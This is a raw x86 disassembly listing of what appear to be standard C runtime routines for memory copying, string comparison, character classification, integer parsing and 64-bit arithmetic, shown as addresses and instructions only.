  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
